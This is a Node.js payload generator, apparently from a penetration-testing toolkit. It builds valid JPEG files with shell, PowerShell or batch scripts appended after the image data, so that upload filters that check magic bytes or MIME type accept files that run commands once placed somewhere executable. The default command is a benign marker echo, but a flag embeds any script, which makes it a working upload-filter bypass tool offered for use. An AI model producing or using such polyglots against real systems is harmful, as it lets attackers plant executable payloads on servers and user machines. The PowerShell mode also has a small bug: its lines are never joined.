#!/usr/bin/env node
// JPEG polyglot generator (repo-vet churchofmalware plan, QW4 — D4rc0d3 model).
// Emits a VALID JPEG whose bytes are simultaneously a shell/PowerShell/batch script:
// the image data ends at the EOI marker (FF D9) and a script body follows it, so
// magic-byte / image-size / MIME-sniffing upload filters pass while the same file,
// once dropped somewhere executable (webshell drop dir, user startup, double-click),
// runs the embedded commands.
//
//   node tools/payloads/upload-bypass/gen-polyglot-jpeg.js --out pwn.jpg --mode sh
//   node tools/payloads/upload-bypass/gen-polyglot-jpeg.js --self-test
//
// Ethics (same rules as every payload in this directory): the DEFAULT embedded command is a
// benign MARKER echo (`echo STAVROS-MARKER`) for detection/attribution only. Passing a custom
// --script is the operator's decision inside an AUTHORIZED engagement/lab; this tool never
// stages payloads by itself and never touches a target.
const fs = require('fs');
const path = require('path');

// Minimal valid 1x1 white baseline JPEG (JFIF). Starts FF D8 FF, ends FF D9.
const MIN_JPEG_B64 =
  '/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwg' +
  'JC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAA' +
  'AAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==';

function baseJpeg() {
  return Buffer.from(MIN_JPEG_B64, 'base64');
}

// Script bodies per mode. Every mode starts with the interpreter shebang/comment line so
// the SAME bytes are a syntactically valid script of that kind; image viewers ignore the
// trailing bytes after EOI.
const MODES = {
  sh: (marker, extraLines) =>
    ['#!/bin/sh', '# stavros upload-filter test artifact (polyglot jpeg)', ...lines(marker, extraLines)].join('\n'),
  pwsh: (marker, extraLines) =>
    ['# stavros upload-filter test artifact (polyglot jpeg)', ...lines(marker, extraLines).map((l) => l)],
  bat: (marker, extraLines) =>
    ['@echo off', 'REM stavros upload-filter test artifact (polyglot jpeg)', ...lines(marker, extraLines)].join('\r\n'),
};

function lines(marker, extraLines) {
  const base = [`echo ${marker}`];
  return base.concat((extraLines || []).filter(Boolean));
}

// Build one polyglot: valid JPEG || "\n" || script-body. Returns { buffer, jpeg_ok, script_len }.
function generate(opts) {
  opts = opts || {};
  const mode = MODES[opts.mode] ? opts.mode : 'sh';
  const marker = String(opts.marker || 'STAVROS-MARKER').replace(/[\r\n]/g, '');
  const jpeg = baseJpeg();
  const scriptBody = MODES[mode](marker, [opts.script]) + '\n';
  const buf = Buffer.concat([jpeg, Buffer.from('\n' + scriptBody, 'utf8')]);
  // structural self-check: SOI present, EOI present before the script tail
  const soi = buf[0] === 0xff && buf[1] === 0xd8;
  let eoi = -1;
  for (let i = buf.length - scriptBody.length - 1; i >= 2; i--) {
    if (buf[i] === 0xff && buf[i + 1] === 0xd9) { eoi = i; break; }
  }
  return { buffer: buf, mode, marker, jpeg_magic_ok: soi && eoi > 0, script_bytes: scriptBody.length };
}

function selfTest() {
  const results = [];
  for (const mode of Object.keys(MODES)) {
    const g = generate({ mode, marker: 'TEST-' + mode.toUpperCase() });
    const nlPos = g.buffer.length - g.script_bytes - 1; // the "\n" separating image and script
    const tail = g.buffer.toString('utf8', nlPos + 1); // the script body only
    results.push({
      mode,
      magic_ok: g.jpeg_magic_ok && g.buffer[0] === 0xff && g.buffer[1] === 0xd8 && g.buffer[2] === 0xff,
      eoi_before_script: g.buffer[nlPos - 2] === 0xff && g.buffer[nlPos - 1] === 0xd9,
      marker_present: tail.includes('TEST-' + mode.toUpperCase()),
      shebang_or_comment: mode === 'sh' ? /#!\/bin\/sh/.test(tail) : mode === 'bat' ? tail.includes('@echo off') : tail.startsWith('#'),
    });
  }
  return results;
}

if (require.main === module) {
  const argv = process.argv.slice(2);
  const flag = (n) => { const i = argv.indexOf(n); return i >= 0 ? argv[i + 1] : null; };
  if (argv.includes('--self-test')) {
    console.log(JSON.stringify({ ok: selfTest().every((r) => r.magic_ok && r.marker_present && r.shebang_or_comment), checks: selfTest() }, null, 2));
    process.exit(0);
  }
  const out = flag('--out');
  const g = generate({
    mode: flag('--mode'),
    marker: flag('--marker'),
    script: flag('--script'),
  });
  if (!out) {
    console.log(JSON.stringify({ ok: true, hint: 'pass --out <file> to write; --self-test to verify structure', ...g, buffer: undefined, size: g.buffer.length }));
    process.exit(0);
  }
  fs.mkdirSync(path.dirname(path.resolve(out)), { recursive: true });
  fs.writeFileSync(out, g.buffer);
  console.log(JSON.stringify({ ok: true, wrote: out, size: g.buffer.length, mode: g.mode, marker: g.marker, jpeg_magic_ok: g.jpeg_magic_ok }, null, 2));
}

module.exports = { generate, selfTest, baseJpeg, MODES };
